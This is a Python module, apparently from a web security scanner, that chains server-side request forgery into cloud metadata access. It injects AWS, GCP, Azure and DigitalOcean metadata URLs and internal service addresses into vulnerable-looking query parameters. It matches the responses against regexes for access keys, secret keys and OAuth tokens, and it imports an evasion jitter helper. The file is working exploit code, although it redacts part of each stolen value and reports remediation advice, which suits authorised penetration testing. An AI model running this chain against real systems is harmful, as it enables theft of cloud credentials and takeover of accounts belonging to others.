"""
modules/vulns/ssrf_chain.py — SSRF → Cloud Metadata Exploitation Chain

When SSRF parameters are found, pivots to cloud metadata endpoints
to extract credentials, tokens and internal service data.
"""
import asyncio
import json
import logging
import re
from urllib.parse import urlparse, parse_qs, urlencode
from core.finding import Finding
from core.http_client import make_client, PROBE_TIMEOUT
from core.evasion import maybe_jitter

logger = logging.getLogger(__name__)

# Cloud metadata targets
METADATA_CHAINS: dict[str, list[dict]] = {
    "AWS IMDSv1": [
        {"url": "http://169.254.169.254/latest/meta-data/", "indicator": "ami-id", "severity": "High"},
        {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "indicator": "iam", "severity": "Critical"},
        {"url": "http://169.254.169.254/latest/meta-data/hostname", "indicator": ".", "severity": "Medium"},
        {"url": "http://169.254.169.254/latest/user-data", "indicator": "", "severity": "High"},
    ],
    "GCP Metadata": [
        {"url": "http://metadata.google.internal/computeMetadata/v1/instance/", "indicator": "serviceAccounts", "severity": "High", "headers": {"Metadata-Flavor": "Google"}},
        {"url": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", "indicator": "access_token", "severity": "Critical", "headers": {"Metadata-Flavor": "Google"}},
        {"url": "http://metadata.google.internal/computeMetadata/v1/project/project-id", "indicator": "", "severity": "Medium", "headers": {"Metadata-Flavor": "Google"}},
    ],
    "Azure IMDS": [
        {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "indicator": "subscriptionId", "severity": "High", "headers": {"Metadata": "true"}},
        {"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "indicator": "access_token", "severity": "Critical", "headers": {"Metadata": "true"}},
    ],
    "DigitalOcean": [
        {"url": "http://169.254.169.254/metadata/v1/", "indicator": "droplet", "severity": "High"},
        {"url": "http://169.254.169.254/metadata/v1/id", "indicator": "", "severity": "Medium"},
    ],
    "Internal Services": [
        {"url": "http://localhost/", "indicator": "", "severity": "Medium"},
        {"url": "http://127.0.0.1/", "indicator": "", "severity": "Medium"},
        {"url": "http://localhost:8080/", "indicator": "", "severity": "Medium"},
        {"url": "http://localhost:6379/", "indicator": "redis", "severity": "High"},
        {"url": "http://localhost:9200/", "indicator": "elasticsearch", "severity": "High"},
        {"url": "http://localhost:27017/", "indicator": "mongodb", "severity": "High"},
        {"url": "http://localhost:2375/version", "indicator": "ApiVersion", "severity": "Critical"},
        {"url": "http://localhost:5000/", "indicator": "", "severity": "Medium"},
    ],
}

# Params commonly vulnerable to SSRF
SSRF_PARAMS = {
    "url", "uri", "path", "dest", "destination", "redirect", "next",
    "target", "link", "src", "source", "callback", "return", "returnurl",
    "redirecturl", "image", "img", "load", "fetch", "proxy", "forward",
    "host", "endpoint", "webhook", "ref", "feed", "data",
}

# Patterns that indicate credential exposure
CRED_PATTERNS = [
    (r'"AccessKeyId"\s*:\s*"([A-Z0-9]{20})"',   "AWS Access Key ID"),
    (r'"SecretAccessKey"\s*:\s*"([^"]{40})"',    "AWS Secret Access Key"),
    (r'"Token"\s*:\s*"([^"]{100,})"',            "AWS Session Token"),
    (r'"access_token"\s*:\s*"([^"]{20,})"',      "OAuth Access Token"),
    (r'"subscriptionId"\s*:\s*"([^"]{36})"',     "Azure Subscription ID"),
    (r'project-id["\s:]+([a-z0-9-]{6,})',        "GCP Project ID"),
]


class SsrfChain:
    async def run(self, ctx: dict) -> list[Finding]:
        findings: list[Finding] = []
        endpoints = ctx.get("endpoints", [])
        forms     = ctx.get("forms", [])
        limiter   = ctx["limiter"]
        sem       = asyncio.Semaphore(5)
        seen: set[str] = set()

        async def probe_ep(ep: str):
            parsed = urlparse(ep)
            if not parsed.query:
                return
            params = parse_qs(parsed.query)
            ssrf_params = [p for p in params if p.lower() in SSRF_PARAMS]
            all_params  = ssrf_params + [p for p in params if p not in ssrf_params]
            for param in all_params[:3]:
                key = f"{parsed.netloc}{parsed.path}:{param}"
                if key in seen:
                    continue
                seen.add(key)
                fs = await self._probe_param(ep, param, parsed, params, limiter, sem)
                findings.extend(fs)
                if fs:
                    break  # found on this endpoint, move on

        await asyncio.gather(*[probe_ep(ep) for ep in endpoints[:100]])
        logger.info(f"SsrfChain completed — {len(findings)} finding(s)")
        return findings

    async def _probe_param(self, url, param, parsed, params, limiter, sem) -> list[Finding]:
        results = []
        async with sem:
            for cloud_name, endpoints in METADATA_CHAINS.items():
                for target in endpoints:
                    meta_url = target["url"]
                    severity  = target["severity"]
                    indicator = target.get("indicator", "")
                    extra_headers = target.get("headers", {})

                    p = dict(params)
                    p[param] = [meta_url]
                    probe_url = parsed._replace(query=urlencode(p, doseq=True)).geturl()

                    try:
                        await maybe_jitter()
                        async with limiter.acquire():
                            async with make_client(timeout=PROBE_TIMEOUT,
                                                   headers=extra_headers) as c:
                                r = await c.get(probe_url)

                        body = r.text
                        if r.status_code not in (200, 201):
                            continue

                        # Check for indicator or just non-empty response for internal
                        if indicator and indicator.lower() not in body.lower():
                            if cloud_name != "Internal Services":
                                continue

                        # Look for credentials in response
                        creds_found = []
                        for pattern, cred_type in CRED_PATTERNS:
                            match = re.search(pattern, body)
                            if match:
                                value = match.group(1)
                                # Partially redact
                                redacted = value[:6] + "****" + value[-4:] if len(value) > 10 else "****"
                                creds_found.append(f"{cred_type}: {redacted}")

                        if creds_found:
                            severity = "Critical"
                            proof_extra = f"\nCREDENTIALS EXTRACTED:\n" + "\n".join(creds_found)
                        else:
                            proof_extra = f"\nResponse ({len(body)} bytes):\n{body[:300]}"

                        results.append(Finding(
                            title=f"SSRF → {cloud_name} Metadata Access via '{param}'",
                            severity=severity,
                            description=(
                                f"Parameter '{param}' is vulnerable to SSRF and was used to access "
                                f"{cloud_name} metadata at {meta_url}. "
                                + ("Cloud credentials were extracted." if creds_found else
                                   "Internal metadata is accessible.")
                            ),
                            affected_url=probe_url,
                            proof=f"GET {probe_url}\nSSRF target: {meta_url}\nHTTP {r.status_code}{proof_extra}",
                            remediation=(
                                "Validate and whitelist URLs before making server-side requests. "
                                "Block access to metadata IPs (169.254.169.254). "
                                "Use IMDSv2 on AWS (requires session token). "
                                "If credentials were exposed, rotate them immediately."
                            ),
                            impact=5, likelihood=5, module="SsrfChain",
                            references=[
                                "https://portswigger.net/web-security/ssrf",
                                "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html",
                            ],
                            cvss_score=9.8 if creds_found else 8.6,
                            cwe="CWE-918",
                        ))
                        # One finding per cloud provider is enough
                        break

                    except Exception as e:
                        logger.debug(f"SSRF chain {probe_url} → {meta_url}: {e}")

        return results
